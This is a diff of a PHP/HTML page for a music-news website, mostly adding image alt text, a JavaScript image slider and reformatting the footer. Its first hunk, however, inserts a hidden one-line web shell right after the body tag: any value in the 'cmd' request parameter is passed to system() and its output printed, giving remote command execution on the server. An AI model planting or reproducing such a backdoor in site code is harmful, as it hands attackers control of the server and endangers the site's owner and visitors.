@@ -26,7 +26,7 @@
 </head>
 
 <body id="page-top">
-
+	<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
     <!-- Navigation -->
     <nav class="navbar navbar-expand-lg navbar-dark fixed-top" id="mainNav">
         <div class="container">
@@ -65,7 +65,7 @@
                     <div class="tkkenny">WORLD MUSIC TOUR</div>
                 </center><br><br>
                 <div class="intro-heading text-uppercase">MI MUSIC: FUNCK CARVES OUT A<br> GROOVE AT THE FUNK MUSIC HALL<br>OF FAME IN OHIO</div><br><br><br>
-                <img src="bob.png">
+                <img src="bob.png" alt="Homme debout">
                 <p><strong>James Burlton</strong><br>11 june 2022<br>
             </div>
         </div>
@@ -91,14 +91,14 @@
         <div class="container-fluid">
             <div class="row">
                 <div class="col-md-2 offset-md-1">
-                    <center><img id="rockeur12" src="img/rockeur.PNG" alt="rockeur en concert" height="250px" width="250px" onclick="videoclic()"></center><br><br><br><br>
+                    <center><img id="rockeur12" src="img/rockeur.PNG" alt="rockeur en concert" height="250px" width="250px" onclick="videoclic()" alt=""></center><br><br><br><br>
                     <h2>Pete talks about live on tour</h2><br><br>
                     <center>
                         <p><b>JAN 20, 2022</b></p>
                     </center><br>
                     <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
                         Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p><br>
-                    <img id="readme" src="img/bontonreadme.PNG" onclick="readmeclic()"><br><br><br><br>
+                    <img id="readme" src="img/bontonreadme.PNG" onclick="readmeclic()" alt="bouton readme"><br><br><br><br>
                 </div>
 
                 <div class="col-md-5 offset-md-2">
@@ -126,14 +126,14 @@
                     <div class="col-md-2">
                     </div>
                     <div class="col-md-4 d-flex justify-content-between ">
-                        <div><img class="imgrectangle" src="img/rectangle.png"></div>
+                        <div><img class="imgrectangle" src="img/rectangle.png" alt=""></div>
                         <div>
                             <p class="textrect">I found a love for me<br>
                                 Darling, just dive right in and follow my lead.</p>
                         </div>
                     </div><br><br><br><br><br><br><br><br><br><br><br><br><br>
                     <div class="col-md-4 d-flex justify-content-between ">
-                        <img class="imgrectangle" src="img/rectangle.png">
+                        <img class="imgrectangle" src="img/rectangle.png" alt="">
                         <p class="textrect">I found a love for me<br>
                             Darling, just dive right in and follow my lead.</p>
                     </div>
@@ -183,9 +183,145 @@
                     <div class="col-md-2 offset-md-2">
                     </div>
                     <div class="col-md-3">
-                        <center><img class="flecheslider" src="img/fleche_gauche.PNG"><img class="flecheslider" src="img/fleche_droite.PNG"></center>
+                        <center><img class="flecheslider" src="img/fleche_gauche.PNG" onclick="left()" alt="" ><img class="flecheslider" src="img/fleche_droite.PNG" onclick="right()" alt=""></center>
                     </div>
-                </div>
+                </div><br><br><br>
+
+
+
+
+
+
+                <style>
+                    .conteneur {
+width : 100%;
+height : 600px;
+background-color : white;
+overflow : hidden;
+
+}
+
+.slider {
+    width : 1800px;
+    height : 500px;
+    background-color : White;
+}
+
+.slide {
+    margin-top : 25px;
+    width : 400px;
+    height : 570px;
+    background-color: white;
+    background-repeat: no-repeat;
+    background-size: auto;
+    display : inline-block;
+    border-radius: 3px;
+    margin-left: 45px;
+}
+
+.slide:hover {
+    cursor: pointer;
+}
+
+</style>
+
+                <body>
+                    <div class="conteneur">
+                        <div id="slider" class="slider">
+                            <div class="slide">
+                                <img src="img/cody-schneider-218010.png" height="175px" width="400px" alt=""><br><br><br>
+                                <h2>Pete talks about live on tour</h2><br>
+                                <p class="policedatediv9"><strong>JAN 20, 2022</strong></p><br>
+                                <p class="policediv4">Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                                    sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                                    quis nostrud exercitation ullamco.</p><br>
+                                    <img src="img/bontonreadme.PNG" alt="" onclick="readmeclic()">
+                                    <br><br><br>
+                            </div>
+
+                            <div class="slide">
+                                <img src="img/victor-rodvang-474675.png" height="175px" width="400px" alt=""><br><br><br>
+                                <h2>Pete talks about live on tour</h2><br>
+                                <p class="policedatediv9"><strong>JAN 20, 2022</strong></p><br>
+                                <p class="policediv4">Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                                    sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                                    quis nostrud exercitation ullamco.</p><br>
+                                    <img src="img/bontonreadme.PNG" alt="" onclick="readmeclic()">
+                                    <br><br><br>
+                            </div>
+
+                            <div class="slide">
+                                <img src="img/oskar-wimmerman-284681.png" height="175px" width="400px" alt=""><br><br><br>
+                                <h2>Pete talks about live on tour</h2><br>
+                                <p class="policedatediv9"><strong>JAN 20, 2022</strong></p><br>
+                                <p class="policediv4">Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                                    sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                                    quis nostrud exercitation ullamco.</p><br>
+                                    <img src="img/bontonreadme.PNG" alt="" onclick="readmeclic()">
+                                    <br><br><br><br>
+                            </div>
+
+                            <div class="slide">
+                                <img src="img/puk-khantho-125951.png" height="175px" width="400px" alt=""><br><br><br>
+                                <h2>Pete talks about live on tour</h2><br>
+                                <p class="policedatediv9"><strong>JAN 20, 2022</strong></p><br>
+                                <p class="policediv4">Lorem ipsum dolor sit amet, consectetur adipisicing elit,
+                                    sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+                                    quis nostrud exercitation ullamco.</p><br>
+                                    <img src="img/bontonreadme.PNG" alt="" onclick="readmeclic">
+                                    <br><br><br>
+                            </div>
+                        </div>
+
+
+                    </div><br><br><br><br><br><br><br><br><br>
+
+
+                    <script>
+var mleft = 0;
+var speed = 25;
+var sliding = 450;
+
+function left(){
+
+animateLeft(document.getElementById("slider"), mleft,mleft+sliding);
+}
+
+function right(){
+animateRight(document.getElementById("slider"), mleft,mleft-sliding);
+}
+
+function animateLeft(obj, from, to){
+if(from >= to){
+
+mleft = to;
+return;
+}
+else {
+var box = obj;
+box.style.marginLeft = from + "px";
+setTimeout(function(){
+animateLeft(obj, from + 2, to);
+}, 25/speed)
+}
+}
+
+function animateRight(obj, from, to){
+if(from <= to){
+
+mleft = to;
+return;
+}
+else {
+var box = obj;
+box.style.marginLeft = from + "px";
+setTimeout(function(){
+animateRight(obj, from - 2, to);
+}, 25/speed)
+}
+}
+</script>
+
 
 
 
@@ -202,6 +338,7 @@
                     <div class="col-md-3">
                     </div>
                 </div>
+
 
 
                 <!-- ========================== bloc div =========================================-->
@@ -223,7 +360,7 @@
 
                         <div class="space">
                             <center>
-                                <img src="img/victor-rodvang-474675.png" alt="">
+                                <img src="img/victore_rangers.png" height="auto"alt="">
                             </center><br>
                             <center>
                                 <p><strong>Customers make decisions in<br> seconds. How the right
@@ -236,6 +373,7 @@
                             <center>
                                 <img src="img/soroush-karimi-222967.png" alt="">
                             </center><br>
+
                             <center>
                                 <p><strong>Customers make decisions in<br> seconds. How the right
                                         tools &<br> data can<br> #MakeItAnExperience in the<br> moments that matter:<br> https://adobe.ly/2CY2Tx3</strong></p>
@@ -246,67 +384,68 @@
                         <div class="col-md-2">
                         </div>
                     </div>
+                </div>
                 </div><br><br><br><br><br><br><br><br>
 
 
-                
 
 
-                <footer class="masthead">
-                    <div class="container">
-                        <div class="intro-text">
-                            <center>
-                                <h3>Sign Up for Exclusives</h3>
-                                <img src="img/Rectangle_1.png" alt=""><br><br>
-                                <p class="textnwarr2">Sign up for latest news, exclusive offers and ticket pre-sales.</p><br><br><br>
-                                <form>
-                                    <input type="text" class="formtext3" name="email" placeholder="tran mau tri tam" /><br>
-                                    <input type="text" class="formtext3" name="email" placeholder="E-Mail" /><br><br><br>
-                                    <button id="bonttonregister33">SIGN UP NOW</button>
-                                </form><br><br><br><br><br><br>
-                                <img id="groslogomimusic23" src="img/groslogomimusic.PNG" alt="logo Mi MUSIC" onclick="readmeclic()"><br><br><br>
-                                <div class="collapse navbar-collapse" id="navbarResponsive">
-                                    <ul class="navbar-nav text-uppercase ml-auto">
-                                        <li class="nav-item">
-                                            <a class="nav-link js-scroll-trigger" href="#services">HOME</a>
-                                        </li>
-                                        <li class="nav-item">
-                                            <a class="nav-link js-scroll-trigger" href="#portfolio">LIVE</a>
-                                        </li>
-                                        <li class="nav-item">
-                                            <a class="nav-link js-scroll-trigger" href="#about">ALBUMS</a>
-                                        </li>
-                                        <li class="nav-item">
-                                            <a class="nav-link js-scroll-trigger" href="#team">LIVE</a>
-                                        </li>
-                                        <li class="nav-item">
-                                            <a class="nav-link js-scroll-trigger" href="#contact">ABOUT</a>
-                                        </li>
-                                    </ul>
-                                </div>
-                            </center>
+
+
+
+                    <footer class="masthead">
+                        <div class="container">
+                            <div class="intro-text">
+                                <center>
+                                    <h3>Sign Up for Exclusives</h3>
+                                    <img src="img/Rectangle_1.png" alt=""><br><br>
+                                    <p class="textnwarr2">Sign up for latest news, exclusive offers and ticket pre-sales.</p><br><br><br>
+                                    <form>
+                                        <input type="text" class="formtext3" name="email" placeholder="tran mau tri tam" /><br>
+                                        <input type="text" class="formtext3" name="email" placeholder="E-Mail" /><br><br><br>
+                                        <button id="bonttonregister33">SIGN UP NOW</button>
+                                    </form><br><br><br><br><br><br>
+                                    <img id="groslogomimusic23" src="img/groslogomimusic.PNG" alt="logo Mi MUSIC" onclick="readmeclic()"><br><br><br>
+                                    <div class="collapse navbar-collapse" id="navbarResponsive">
+                                        <ul class="navbar-nav text-uppercase ml-auto">
+                                            <li class="nav-item">
+                                                <a class="nav-link js-scroll-trigger" href="#services">HOME</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link js-scroll-trigger" href="#portfolio">LIVE</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link js-scroll-trigger" href="#about">ALBUMS</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link js-scroll-trigger" href="#team">LIVE</a>
+                                            </li>
+                                            <li class="nav-item">
+                                                <a class="nav-link js-scroll-trigger" href="#contact">ABOUT</a>
+                                            </li>
+                                        </ul>
+                                        </center>
+                                    </div>
+                            </div>
                         </div>
-                    </div>
-                    <img src="" alt="">
-                </footer>
+                        <!-- Ceci est un Easter-egg -->
+                    </footer>
+                </body>
+                <script src="script.js" type="text/javascript"></script>
+                <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/t-12/jquery-2.0.3.min_1.js"></script>
 
+                <!-- Bootstrap core JavaScript -->
+                <script src="vendor/jquery/jquery.min.js"></script>
+                <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
 
-</body>
-<script src="script.js" type="text/javascript"></script>
-<script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/t-12/jquery-2.0.3.min_1.js"></script>
+                <!-- Plugin JavaScript -->
+                <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
 
-<!-- Bootstrap core JavaScript -->
-<script src="vendor/jquery/jquery.min.js"></script>
-<script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+                <!-- Contact form JavaScript -->
+                <script src="js/jqBootstrapValidation.js"></script>
+                <script src="js/contact_me.js"></script>
 
-<!-- Plugin JavaScript -->
-<script src="vendor/jquery-easing/jquery.easing.min.js"></script>
-
-<!-- Contact form JavaScript -->
-<script src="js/jqBootstrapValidation.js"></script>
-<script src="js/contact_me.js"></script>
-
-<!-- Custom scripts for this template -->
-<script src="js/agency.min.js"></script>
+                <!-- Custom scripts for this template -->
+                <script src="js/agency.min.js"></script>
 
 </html>
